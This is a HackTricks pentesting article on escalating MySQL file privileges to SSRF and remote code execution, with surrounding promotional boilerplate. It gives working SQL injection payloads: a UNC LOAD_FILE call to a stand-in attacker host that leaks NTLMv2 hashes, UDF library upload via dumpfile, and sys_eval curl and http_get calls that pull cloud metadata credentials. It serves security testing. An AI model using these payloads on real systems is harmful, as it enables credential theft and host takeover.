# MySQL File priv to SSRF/RCE

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

### LOAD\_FILE/LOAD DATA/LOAD XML to SSRF

Every SQL Out of Band data exfiltration article will use the `LOAD_FILE()` string function to make a network request. The function itself has its own limitations based on the operating system it is run on and the settings with which the database was started.

For example, if the `secure_file_priv` global variable was not set, the [default value is set to `/var/lib/mysql-files/`](https://dev.mysql.com/doc/mysql-installation-excerpt/5.7/en/linux-installation-rpm.html), which means that you can only use functions like `LOAD_FILE('filename')` or `LOAD DATA [LOCAL] INFILE 'filename' INTO TABLE tablename` to read files from the `/var/lib/mysql-files/` directory. To be able to perform reads on files outside this directory, the `secure_file_priv` option has to be set to `""` which can only be done by updating the database configuration file or by passing the `--secure_file_priv=""` as a startup parameter to the database service.

Nevertheless, under circumstances where `secure_file_priv` is set to `""`, we should be able to read other files on the system, assuming file read perms and `file_priv` is set to `Y` in `mysql.user` for current database user. However, being able to use these functions to make network calls is very operating system dependent. As these functions are built only to read files, the only network relevant calls that can be made are to UNC paths on Windows hosts as the [Windows `CreateFileA` api that is called when accessing a file understands UNC naming conventions](https://docs.microsoft.com/en-gb/windows/win32/fileio/naming-a-file).

So if your target database is running on a Windows machine the injection query `x'; SELECT LOAD_FILE('\\\\attackerserver.example.com\\a.txt'); -- //` would [result in the Windows machine sending out NTLMv2 hashes in an attempt to authenticate with the attacker controlled `\\attackerserver.example.com`](https://packetstormsecurity.com/files/140832/MySQL-OOB-Hacking.html).

This Server Side Request Forgery, although useful, is restricted to only TCP port 445. You cannot control the port number, but can read information from shares setup with full read privs. Also, as has been shown with older research, you can use this limited SSRF capability to steal hashes and relay them to get shells, so it’s definitely useful.

### User Defined Functions to RCE

Another cool technique with MySQL databases is the ability to use User Defined Functions (UDF) present in external library files that if present in specific locations or system $PATH then can be accessed from within MySQL.

You could use a SQL Injection to **write a library (`.so` or `.dll`** depending on Linux or Windows), containing a User Defined Function that can make network/HTTP requests, that can be then invoked through additional queries.

This has its own set of restrictions though. Based on the version of MySQL, which you can identify with `select @@version`, the directory where plugins can be loaded from is restricted. MySQL below `v5.0.67` allowed for library files to be loaded from system path if the `plugin_dir` variable was not set. This has changed now and newer versions have the **`plugin_dir`** variable set to something like `/usr/lib/mysql/plugin/`, which is usually owned by root.

Basically **for you to load a custom library into MySQL and call a function from the loaded library via SQL Injection, you would need**:

* ability to **write to the location** specified in **`@@plugin_dir`** via SQL Injection
* **`file_priv`** set to **`Y`** in `mysql.user` for the current database user
* **`secure_file_priv`** set to **`""`** so that you can read the raw bytes of the library from an arbitrary location like the network or a file uploads directory in a web application.

Assuming the above conditions are met, you can use the **classical approach of transferring the** [**popular MySQL UDF `lib_mysqludf_sys` library**](https://github.com/mysqludf/lib\_mysqludf\_sys) **to the database server**. You would then be able to make operating system command requests like `cURL` or `powershell wget` to perform SSRF using the syntax

`x'; SELECT sys_eval('curl http://169.254.169.254/latest/meta-data/iam/security-credentials/'); -- //`

There are a lot of other functions declared in this library, an analysis of which can be seen [here](https://osandamalith.com/2018/02/11/mysql-udf-exploitation/). If you are lazy like me, you can grab a copy of this UDF library, for the target OS, from a metasploit installation from the `/usr/share/metasploit-framework/data/exploits/mysql/` directory and get going.

Alternatively, UDF libraries have been created to specifically provide the database the ability to make HTTP requests. You can use [MySQL User-defined function (UDF) for HTTP GET/POST](https://github.com/y-ken/mysql-udf-http) to get the database to make HTTP requests, using the following syntax

`x'; SELECT http_get('http://169.254.169.254/latest/meta-data/iam/security-credentials/'); -- //`

You could also [create your own UDF and use that for post exploitation as well.](https://pure.security/simple-mysql-backdoor-using-user-defined-functions/)

In any case, you need to transfer the library to the database server. You can do this in multiple ways

1. Use the MySQL `hex()` string function or something like `xxd -p filename.so | tr -d '\n'` to convert the contents of the library to hex format and then dumping it to the `@@plugin_dir` directory using `x'; SELECT unhex(0x1234abcd12abcdef1223.....) into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so' -- //`
2. Alternatively, convert the contents of `filename.so` to base64 and use `x';select from_base64("AAAABB....") into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so' -- //`

If the `@@plugin_dir` is not writable, then you are out of luck if the version is above `v5.0.67`. Otherwise, write to a different location that is in path and load the UDF library from there using

* for the `lib_mysqludf_sys` library - `x';create function sys_eval returns string soname 'lib_mysqludf_sys.so'; -- //`
* for the `mysql-udf-http` library - `x';create function http_get returns string soname 'mysql-udf-http.so'; -- //`


For automating this, you can use SQLMap which supports [the usage of custom UDF via the `--udf-inject` option](https://github.com/sqlmapproject/sqlmap/wiki/Usage).

For Blind SQL Injections you could redirect output of the UDF functions to a temporay table and then read the data from there or use [DNS request smuggled inside a `sys_eval` or `sys_exec` curl command](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration).

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
